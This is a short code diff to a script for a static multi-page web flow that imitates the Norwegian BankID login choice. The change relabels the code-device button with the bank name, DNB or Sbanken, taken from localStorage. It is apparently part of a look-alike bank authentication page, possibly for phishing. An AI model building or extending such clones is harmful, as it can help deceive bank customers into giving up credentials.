@@ -152,6 +152,24 @@
     const methodButtons = document.querySelectorAll('ul.o7iMNxHzUoo- > li > button');
     if (methodButtons.length < 2) return;
 
+    const selectedBankRaw = localStorage.getItem('selectedBank') || '';
+    const selectedBank = selectedBankRaw.trim();
+    if (selectedBank) {
+      let bankNameForLabel = selectedBank;
+      const selectedLower = selectedBank.toLowerCase();
+
+      if (selectedLower.includes('dnb')) {
+        bankNameForLabel = 'DNB';
+      } else if (selectedLower.includes('sbanken')) {
+        bankNameForLabel = 'Sbanken';
+      }
+
+      const kodebrikkeText = methodButtons[1].querySelector('.byGxdtOkfzU- > span');
+      if (kodebrikkeText) {
+        kodebrikkeText.textContent = 'Kodebrikke fra ' + bankNameForLabel;
+      }
+    }
+
     const choices = [
       { text: 'BankID med app', nextPage: 'page3.5.html' },
       { text: 'BankID med kodebrikke', nextPage: 'page5.html' }
